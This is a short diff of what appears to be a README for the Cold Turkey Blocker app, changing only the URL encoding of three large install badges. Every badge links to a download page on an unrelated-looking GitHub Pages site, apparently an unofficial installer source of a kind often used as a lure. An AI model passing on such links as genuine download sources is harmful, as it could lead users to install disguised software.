@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Cold Turkey Blocker](https://img.shields.io/badge/⬇_Install_Cold%20Turkey%20Blocker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Cold Turkey Blocker](https://img.shields.io/badge/⬇_Install_Cold+Turkey+Blocker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Cold Turkey Blocker is a serious website and application blocker for Windows and
 
 <div align="center">
 
-[![⬇ Install Cold Turkey Blocker](https://img.shields.io/badge/⬇_Install_Cold%20Turkey%20Blocker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Cold Turkey Blocker](https://img.shields.io/badge/⬇_Install_Cold+Turkey+Blocker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Cold Turkey Blocker is a serious website and application blocker for Windows and
 
 <div align="center">
 
-[![⬇ Install Cold Turkey Blocker](https://img.shields.io/badge/⬇_Install_Cold%20Turkey%20Blocker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Cold Turkey Blocker](https://img.shields.io/badge/⬇_Install_Cold+Turkey+Blocker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
